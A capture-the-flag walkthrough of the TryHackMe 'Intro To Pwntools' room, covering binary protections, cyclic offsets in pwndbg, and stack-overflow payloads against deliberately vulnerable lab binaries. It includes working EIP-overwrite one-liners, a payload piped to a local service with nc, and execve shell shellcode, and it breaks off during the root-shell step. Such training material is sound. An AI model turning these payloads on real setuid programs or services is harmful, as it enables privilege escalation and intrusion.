## Challenge name: Intro To Pwntools


<img width="1108" height="185" alt="image" src="https://github.com/user-attachments/assets/f87dad46-38cf-411b-a8a5-97484ff349ce" />
<br>
<br>

```Room Link:``` [https://tryhackme.com/room/introtopwntools](https://tryhackme.com/room/introtopwntools)
<br>
<br>

---

### Task 1 - Introduction

**Read the given content.**

---

### Task 2 - Checksec

**1) Does Intro2pwn1 have FULL RELRO (Y or N)?**

```
buzz@ip-10-49-191-74:~/IntroToPwntools/IntroToPwntools/checksec$ checksec --file=./intro2pwn1
[*] '/home/buzz/IntroToPwntools/IntroToPwntools/checksec/intro2pwn1'
    Arch:       i386-32-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```

> Y

**2) Does Intro2pwn1 have RWX segments (Y or N)?**


```
buzz@ip-10-49-191-74:~/IntroToPwntools/IntroToPwntools/checksec$ readelf -W -l ./intro2pwn1

Elf file type is DYN (Shared object file)
Entry point 0x470
There are 9 program headers, starting at offset 52

Program Headers:
  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
  PHDR           0x000034 0x00000034 0x00000034 0x00120 0x00120 R   0x4
  INTERP         0x000154 0x00000154 0x00000154 0x00013 0x00013 R   0x1
      [Requesting program interpreter: /lib/ld-linux.so.2]
  LOAD           0x000000 0x00000000 0x00000000 0x00834 0x00834 R E 0x1000
  LOAD           0x000ed0 0x00001ed0 0x00001ed0 0x00138 0x0013c RW  0x1000
  DYNAMIC        0x000ed8 0x00001ed8 0x00001ed8 0x000f8 0x000f8 RW  0x4
  NOTE           0x000168 0x00000168 0x00000168 0x00044 0x00044 R   0x4
  GNU_EH_FRAME   0x0006f4 0x000006f4 0x000006f4 0x0003c 0x0003c R   0x4
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10
  GNU_RELRO      0x000ed0 0x00001ed0 0x00001ed0 0x00130 0x00130 R   0x1

 Section to Segment mapping:
  Segment Sections...
   00
   01     .interp
   02     .interp .note.ABI-tag .note.gnu.build-id .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rel.dyn .rel.plt .init .plt .plt.got .text .fini .rodata .eh_frame_hdr .eh_frame
   03     .init_array .fini_array .dynamic .got .data .bss
   04     .dynamic
   05     .note.ABI-tag .note.gnu.build-id
   06     .eh_frame_hdr
   07
   08     .init_array .fini_array .dynamic .got
buzz@ip-10-49-191-74:~/IntroToPwntools/IntroToPwntools/checksec$
```

*It doesn't mean the rwx shown by ls -l. That is just the file permissions. RWX segments are about the permissions of the memory segments inside the ELF. I checked it with readelf -l ./intro2pwn1 and looked at the Flg column. It has R E for the code segment and RW for the writable segment, but there is no RWE segment. So it does not have an RWX segment. Also GNU_STACK is RW, not RWE, which means the stack is not executable (NX is enabled). Which you can also see in checksec output.*

> N

**3) Does Intro2pwn2 have a stack canary (Y or N)?**

*A stack canary is basically a secret value placed on the stack between a local buffer and important control data, such as the saved return address.*

*Conceptually:*

*Normal stack:*

```
Higher addresses
+-------------------+
| Return address    |  ← important
+-------------------+
| Stack canary      |  ← 🛡️
+-------------------+
| char buffer[32]   |
|                   |
+-------------------+
Lower addresses
```

*Suppose a buffer overflow happens:*

```
char buffer[32];
gets(buffer);
```

*If you enter too much data, it can overwrite things beyond the buffer:*

```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
BBBBBBBB
CCCCCCCC
```

*Without a canary:*

```
buffer → saved data → return address
                         ↑
                    can be overwritten
With a canary:

buffer → CANARY → return address
            ↑
       overflow hits this
```

*Before the function returns, the program checks whether the canary is still the expected value.*

*Conceptually:*

```
Canary unchanged?
       ↓
      YES → return normally
       ↓
       NO
       ↓
"stack smashing detected"
       ↓
    program dies
```

*running checksec against intro2pwn2:*

```
buzz@ip-10-49-191-74:~/IntroToPwntools/IntroToPwntools/checksec$ checksec --file=./intro2pwn2
[*] '/home/buzz/IntroToPwntools/IntroToPwntools/checksec/intro2pwn2'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x8048000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
buzz@ip-10-49-191-74:~/IntroToPwntools/IntroToPwntools/checksec$
```

> N

**Does Intro2pwn2 not have PIE (Y or N)?**

*PIE = Position Independent Executable.* <br>
*It means the executable can be loaded at different memory addresses instead of always being loaded at one fixed address. This works together with ASLR to randomize where the program is loaded, making it harder to predict addresses when exploiting a binary.*

```
No PIE:
program → same base address
          0x08048000

PIE:
program → can be loaded at different addresses
          0x56555000
          0x61234000
          0x5748a000
          ...
```

```
buzz@ip-10-49-191-74:~/IntroToPwntools/IntroToPwntools/checksec$ checksec --file=./intro2pwn2
[*] '/home/buzz/IntroToPwntools/IntroToPwntools/checksec/intro2pwn2'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x8048000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
buzz@ip-10-49-191-74:~/IntroToPwntools/IntroToPwntools/checksec$
```

> Y

**Cause a buffer overflow on intro2pwn1 by inputting a long string such as AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA. What was detected?**

```
buzz@ip-10-49-191-74:~/IntroToPwntools/IntroToPwntools/checksec$ ./intro2pwn1
Please input your name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
*** stack smashing detected ***: terminated
Aborted (core dumped)
```

> Stack Smashing

**Now cause a buffer overflow on intro2pwn2. What error do you get?**

> Segmentation fault

---

### Task 3 - Cyclic

**Which user owns both the flag.txt and intro2pwn3 file?**

```
buzz@ip-10-48-135-178:~/IntroToPwntools/IntroToPwntools/cyclic$ ls -ali
total 32
279394 drwxrwxr-x 2 buzz   buzz   4096 Jun 30  2025 .
279392 drwxrwxr-x 6 buzz   buzz   4096 May 19  2021 ..
268312 -rw-rw-r-- 1 buzz   buzz    105 May 19  2021 alphabet
268313 -r--r----- 1 dizmas dizmas   22 May 19  2021 flag.txt
279323 -rw------- 1 buzz   buzz    101 Jun  9  2021 .gdb_history
268314 -rwsrwxr-x 1 dizmas dizmas 7444 May 19  2021 intro2pwn3
285728 -rw-rw-r-- 1 buzz   buzz    359 Jun 10  2021 test_cyclic.c
```

> dizmas

**Use checksec on intro2pwn3. What bird-themed protection is missing?**

```
buzz@ip-10-48-135-178:~/IntroToPwntools/IntroToPwntools/cyclic$ checksec intro2pwn3
[*] Checking for new versions of pwntools
    To disable this functionality, set the contents of /home/buzz/.cache/.pwntools-cache-3.8/update to 'never' (old way).
    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):
        [update]
        interval=never
[!] An issue occurred while checking PyPI
[*] You have the latest version of Pwntools (4.14.1)
[*] '/home/buzz/IntroToPwntools/IntroToPwntools/cyclic/intro2pwn3'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
buzz@ip-10-48-135-178:~/IntroToPwntools/IntroToPwntools/cyclic$
```

*If you have tmp mem like me here wat those mean again..*

*Canary → a secret value placed on the stack; if an overflow changes it, the program detects it and stops.* <br>
*GOT (Global Offset Table) → a table that stores addresses of functions the program uses, like printf() and puts().* <br>
*RELRO → protects that GOT from being overwritten; Full RELRO = GOT read-only, Partial = some protection.* <br>
*NX → marks the stack as non-executable, so injected shellcode can't run directly from it.* <br>
*PIE → makes the program's own addresses randomized, making exploits harder.* 

> canary

**What ascii letter sequence is 0x4a4a4a4a (pwndbg should tell you).**

```
4a in hex is j in ASCII watch ascii table for this i guess..
```

> jjjj

**What is the output of "cyclic 12"?**

```
buzz@ip-10-48-135-178:~/IntroToPwntools/IntroToPwntools/cyclic$ gdb intro2pwn3
GNU gdb (Ubuntu 9.2-0ubuntu1~20.04.2) 9.2
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
pwndbg: loaded 195 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from intro2pwn3...
(No debugging symbols found in intro2pwn3)
pwndbg> cyclic 12
aaaabaaacaaa
pwndbg>
```

> aaaabaaacaaa

**What pattern, in hex, was the eip overflowed with?**

```
buzz@ip-10-48-135-178:~/IntroToPwntools/IntroToPwntools/cyclic$ cyclic 200 > pattern.txt
buzz@ip-10-48-135-178:~/IntroToPwntools/IntroToPwntools/cyclic$ cat pattern.txt
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabbuzz@ip-10-48-135-178:~/IntroToPwntools/IntroToPwntools/cyclic$ gdb intro2pwn3
GNU gdb (Ubuntu 9.2-0ubuntu1~20.04.2) 9.2
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
pwndbg: loaded 195 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from intro2pwn3...
(No debugging symbols found in intro2pwn3)
pwndbg> r < pattern.txt
Starting program: /home/buzz/IntroToPwntools/IntroToPwntools/cyclic/intro2pwn3 < pattern.txt
I run as dizmas.

Program received signal SIGSEGV, Segmentation fault.
0x6161616a in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────────────────────────────────────────────────────────────
 EAX  0xffe1cec8 ◂— 0x61616161 ('aaaa')
 EBX  0x61616168 ('haaa')
 ECX  0xf7f79580 (_IO_2_1_stdin_) ◂— 0xfbad2098
 EDX  0xffe1cf90 —▸ 0x8048600 (main+47) ◂— lea    eax, dword ptr [ebx - 0x191f]
 EDI  0xf7f79000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c
 ESI  0xf7f79000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c
 EBP  0x61616169 ('iaaa')
 ESP  0xffe1cef0 ◂— 'kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
 EIP  0x6161616a ('jaaa')
────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────────────────────────────────────────────────────
Invalid address 0x6161616a










────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ esp 0xffe1cef0 ◂— 'kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
01:0004│     0xffe1cef4 ◂— 'laaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
02:0008│     0xffe1cef8 ◂— 'maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
03:000c│     0xffe1cefc ◂— 'naaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
04:0010│     0xffe1cf00 ◂— 'oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
05:0014│     0xffe1cf04 ◂— 'paaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
06:0018│     0xffe1cf08 ◂— 'qaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
07:001c│     0xffe1cf0c ◂— 'raaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
──────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────────────────────────────────────────────
 ► f 0 0x6161616a
   f 1 0x6161616b
   f 2 0x6161616c
   f 3 0x6161616d
   f 4 0x6161616e
   f 5 0x6161616f
   f 6 0x61616170
   f 7 0x61616171
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg>
```

> 0x6161616a

**I have overflowed the eip with 0xdeadbeef**

```
buzz@ip-10-48-135-178:~/IntroToPwntools/IntroToPwntools/cyclic$ cyclic -l jaaa
36
buzz@ip-10-48-135-178:~/IntroToPwntools/IntroToPwntools/cyclic$ python3 -c 'import sys; sys.stdout.buffer.write(b"A"*36 + b"\xef\xbe\xad\xde")' > payload.txt
buzz@ip-10-48-135-178:~/IntroToPwntools/IntroToPwntools/cyclic$ cat payload.txt
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ�buzz@ip-10-48-135-178:~/IntroToPwntools/IntroToPwntools/cyclic$ gdb ./intro2pwn3
GNU gdb (Ubuntu 9.2-0ubuntu1~20.04.2) 9.2
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
pwndbg: loaded 195 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from ./intro2pwn3...
(No debugging symbols found in ./intro2pwn3)
pwndbg> r < payload.txt
Starting program: /home/buzz/IntroToPwntools/IntroToPwntools/cyclic/intro2pwn3 < payload.txt
I run as dizmas.

Program received signal SIGSEGV, Segmentation fault.
0xdeadbeef in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────────────────────────────────────────────────────────────
 EAX  0xffcbdf88 ◂— 0x41414141 ('AAAA')
 EBX  0x41414141 ('AAAA')
 ECX  0xf7ed8580 (_IO_2_1_stdin_) ◂— 0xfbad2098
 EDX  0xffcbdfb0 —▸ 0xffcbdf00 ◂— 0x0
 EDI  0xf7ed8000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c
 ESI  0xf7ed8000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c
 EBP  0x41414141 ('AAAA')
 ESP  0xffcbdfb0 —▸ 0xffcbdf00 ◂— 0x0
 EIP  0xdeadbeef
────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────────────────────────────────────────────────────
Invalid address 0xdeadbeef










────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ edx esp 0xffcbdfb0 —▸ 0xffcbdf00 ◂— 0x0
01:0004│         0xffcbdfb4 ◂— 0x0
02:0008│         0xffcbdfb8 ◂— 0x0
03:000c│         0xffcbdfbc —▸ 0xf7d07ed5 (__libc_start_main+245) ◂— add    esp, 0x10
04:0010│         0xffcbdfc0 —▸ 0xf7ed8000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c
05:0014│         0xffcbdfc4 —▸ 0xf7ed8000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c
06:0018│         0xffcbdfc8 ◂— 0x0
07:001c│         0xffcbdfcc —▸ 0xf7d07ed5 (__libc_start_main+245) ◂— add    esp, 0x10
──────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────────────────────────────────────────────
 ► f 0 0xdeadbeef
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg>
```

> No ans needed

**What is the flag?**

```
buzz@ip-10-48-135-178:~/IntroToPwntools/IntroToPwntools/cyclic$ objdump -d intro2pwn3
# found function called print_flag
# use this to see only functions
buzz@ip-10-48-135-178:~/IntroToPwntools/IntroToPwntools/cyclic$ objdump -t intro2pwn3 | grep ' F '
08048480 l     F .text  00000000              deregister_tm_clones
080484c0 l     F .text  00000000              register_tm_clones
08048500 l     F .text  00000000              __do_global_dtors_aux
08048530 l     F .text  00000000              frame_dummy
08048690 g     F .text  00000002              __libc_csu_fini
08048470 g     F .text  00000004              .hidden __x86.get_pc_thunk.bx
00000000       F *UND*  00000000              printf@@GLIBC_2.0
00000000       F *UND*  00000000              fflush@@GLIBC_2.0
00000000       F *UND*  00000000              gets@@GLIBC_2.0
08048694 g     F .fini  00000000              _fini
00000000       F *UND*  00000000              puts@@GLIBC_2.0
080485a9 g     F .text  00000028              start
00000000       F *UND*  00000000              exit@@GLIBC_2.0
00000000       F *UND*  00000000              __libc_start_main@@GLIBC_2.0
00000000       F *UND*  00000000              execve@@GLIBC_2.0
08048630 g     F .text  0000005d              __libc_csu_init
08048460 g     F .text  00000002              .hidden _dl_relocate_static_pie
08048420 g     F .text  00000000              _start
080485d1 g     F .text  00000052              main
08048623 g     F .text  00000000              .hidden __x86.get_pc_thunk.ax
08048536 g     F .text  00000073              print_flag
0804836c g     F .init  00000000              _init
buzz@ip-10-48-135-178:~/IntroToPwntools/IntroToPwntools/cyclic$ python3 -c 'import sys; sys.stdout.buffer.write(b"A"*36 + b"\x36\x85\x04\x08")' > payload.txt
buzz@ip-10-48-135-178:~/IntroToPwntools/IntroToPwntools/cyclic$ ./intro2pwn3 < payload.txt
I run as dizmas.
Who are you?: Getting Flag:
flag{13@rning_2_pwn!}
buzz@ip-10-48-135-178:~/IntroToPwntools/IntroToPwntools/cyclic$
```

> flag{13@rning_2_pwn!}

---

### Task 4 - Networking

**What port is serving our challenge?**

```
buzz@ip-10-48-135-178:~/IntroToPwntools/IntroToPwntools/networking$ ls
note_to_buzz.txt  serve_test  test_networking.c
buzz@ip-10-48-135-178:~/IntroToPwntools/IntroToPwntools/networking$ cat note_to_buzz.txt
Dear buzz,

I'm running a service on port 1337, which has an overflow vulnerability.
I've left you a version that will run on port 1336 so that you can develop
your exploit.

Sincerely,
dizmas
```

> 1337

**Please use checksec on serve_test. Is there a stack canary? (Y or N)**

```
buzz@ip-10-48-135-178:~/IntroToPwntools/IntroToPwntools/networking$ checksec --file=./serve_test
[*] '/home/buzz/IntroToPwntools/IntroToPwntools/networking/serve_test'
    Arch:       i386-32-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
buzz@ip-10-48-135-178:~/IntroToPwntools/IntroToPwntools/networking$
```

> Y

**What is the flag?**

```
buzz@ip-10-48-135-178:~/IntroToPwntools/IntroToPwntools/networking$ printf 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde' | nc 127.0.0.1 1337
Give me deadbeef: Thank you!
flag{n3tw0rk!ng_!$_fun}
buzz@ip-10-48-135-178:~/IntroToPwntools/IntroToPwntools/networking$
```

> flag{n3tw0rk!ng_!$_fun}

---

### Task 5 - Shellcraft

**What does ASLR stand for?**

> address space layout randomization

**Who owns intro2pwnFinal?**

```
buzz@ip-10-48-135-178:~/IntroToPwntools/IntroToPwntools/shellcraft$ ls -ali
total 32
279396 drwxrwxr-x 2 buzz   buzz   4096 Jun 10  2021 .
279392 drwxrwxr-x 6 buzz   buzz   4096 May 19  2021 ..
268319 -rwxrwxr-x 1 dizmas dizmas   49 May 19  2021 disable_aslr.sh
296224 -rw------- 1 buzz   buzz     71 Jun  9  2021 .gdb_history
268320 -rwsrwxr-x 1 root   root   7236 May 19  2021 intro2pwnFinal
268321 -rw-rw-r-- 1 dizmas dizmas  233 May 19  2021 note_to_buzz_2.txt
268322 -rw-rw-r-- 1 buzz   buzz    191 Jun  9  2021 test_shellcraft.c
buzz@ip-10-48-135-178:~/IntroToPwntools/IntroToPwntools/shellcraft$
```

> root

**Use checksec on intro2pwn final. Is NX enabled? (Y or N)**

```
buzz@ip-10-48-135-178:~/IntroToPwntools/IntroToPwntools/shellcraft$ checksec --file=./intro2pwnFinal
[*] '/home/buzz/IntroToPwntools/IntroToPwntools/shellcraft/intro2pwnFinal'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x8048000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
buzz@ip-10-48-135-178:~/IntroToPwntools/IntroToPwntools/shellcraft$
```

> N

**Please use the cyclic tool and gdb to find the eip. What letter sequence fills the eip?**

```
buzz@ip-10-48-135-178:~/IntroToPwntools/IntroToPwntools/shellcraft$ gdb -q ./intro2pwnFinal
pwndbg: loaded 195 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from ./intro2pwnFinal...
(No debugging symbols found in ./intro2pwnFinal)
pwndbg> run < <(cyclic 100)
Starting program: /home/buzz/IntroToPwntools/IntroToPwntools/shellcraft/intro2pwnFinal < <(cyclic 100)
Hello There. Do you have an input for me?

Program received signal SIGSEGV, Segmentation fault.
0x61616174 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────────────────────────────────────────────────────────────
 EAX  0xfff0da80 ◂— 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
 EBX  0x61616172 ('raaa')
 ECX  0xf7ec7580 (_IO_2_1_stdin_) ◂— 0xfbad2098
 EDX  0xfff0dae4 —▸ 0xf7ec7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c
 EDI  0xf7ec7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c
 ESI  0xf7ec7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c
 EBP  0x61616173 ('saaa')
 ESP  0xfff0dad0 ◂— 'uaaavaaawaaaxaaayaaa'
 EIP  0x61616174 ('taaa')
────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────────────────────────────────────────────────────
Invalid address 0x61616174










────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ esp 0xfff0dad0 ◂— 'uaaavaaawaaaxaaayaaa'
01:0004│     0xfff0dad4 ◂— 'vaaawaaaxaaayaaa'
02:0008│     0xfff0dad8 ◂— 'waaaxaaayaaa'
03:000c│     0xfff0dadc ◂— 'xaaayaaa'
04:0010│     0xfff0dae0 ◂— 'yaaa'
05:0014│ edx 0xfff0dae4 —▸ 0xf7ec7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c
06:0018│     0xfff0dae8 ◂— 0x0
07:001c│     0xfff0daec —▸ 0xf7cf6ed5 (__libc_start_main+245) ◂— add    esp, 0x10
──────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────────────────────────────────────────────
 ► f 0 0x61616174
   f 1 0x61616175
   f 2 0x61616176
   f 3 0x61616177
   f 4 0x61616178
   f 5 0x61616179
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> quit
buzz@ip-10-48-135-178:~/IntroToPwntools/IntroToPwntools/shellcraft$ cyclic -l taaa
76
buzz@ip-10-48-135-178:~/IntroToPwntools/IntroToPwntools/shellcraft$
```

> taaa

**Run your exploit with the breakpoint outside of gdb (./intro2pwnFinal < output_file). What does it say when you hit the breakpoint?**

> Trace/breakpoint trap

**Run the command "shellcraft i386.linux.sh -f a", which will print our shellcode in assembly format. The first line will tell you that it is running a function from the Unix standard library, with the parameters of "(path='/bin///sh', argv=['sh'], envp=0)." What function is it using?**

```
buzz@ip-10-48-135-178:~/IntroToPwntools/IntroToPwntools/shellcraft$ shellcraft i386.linux.sh -f a
    /* execve(path='/bin///sh', argv=['sh'], envp=0) */
    /* push b'/bin///sh\x00' */
    push 0x68
    push 0x732f2f2f
    push 0x6e69622f
    mov ebx, esp
    /* push argument array ['sh\x00'] */
    /* push 'sh\x00\x00' */
    push 0x1010101
    xor dword ptr [esp], 0x1016972
    xor ecx, ecx
    push ecx /* null terminate */
    push 4
    pop ecx
    add ecx, esp
    push ecx /* 'sh\x00' */
    mov ecx, esp
    xor edx, edx
    /* call execve() */
    push SYS_execve /* 0xb */
    pop eax
    int 0x80

buzz@ip-10-48-135-178:~/IntroToPwntools/IntroToPwntools/shellcraft$
```

> execve

**Run whoami once you have the shell. Who are you?**

```
buzz@ip-10-48-135-178:~/IntroToPwntools/IntroToPwntools/shellcraft$ sudo ./*.sh
0
buzz@ip-10-48-135-178:~/IntroToPwntools/IntroToPwntools/shellcraft$ cat /proc/sys/kernel/randomize_va_space
0
buzz@ip-10-48-135-178:~/IntroToPwntools/IntroToPwntools/shellcraft$ checksec ./intro2pwnFinal
[*] '/home/buzz/IntroToPwntools/IntroToPwntools/shellcraft/intro2pwnFinal'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x8048000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
buzz@ip-10-48-135-178:~/IntroToPwntools/IntroToPwntools/shellcraft$ gdb -q ./intro2pwnFinal
pwndbg: loaded 195 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from ./intro2pwnFinal...
(No debugging symbols found in ./intro2pwnFinal)
pwndbg> r < <(cyclic 100)
Starting program: /home/buzz/IntroToPwntools/IntroToPwntools/shellcraft/intro2pwnFinal < <(cyclic 100)
Hello There. Do you have an input for me?

Program received signal SIGSEGV, Segmentation fault.
0x61616174 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────────────────────────────────────────────────────────────
 EAX  0xffffd410 ◂— 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
 EBX  0x61616172 ('raaa')
 ECX  0xf7fba580 (_IO_2_1_stdin_) ◂— 0xfbad2098
 EDX  0xffffd474 —▸ 0xf7fba000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c
 EDI  0xf7fba000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c
 ESI  0xf7fba000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c
 EBP  0x61616173 ('saaa')
 ESP  0xffffd460 ◂— 'uaaavaaawaaaxaaayaaa'
 EIP  0x61616174 ('taaa')
────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────────────────────────────────────────────────────
Invalid address 0x61616174










────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ esp 0xffffd460 ◂— 'uaaavaaawaaaxaaayaaa'
01:0004│     0xffffd464 ◂— 'vaaawaaaxaaayaaa'
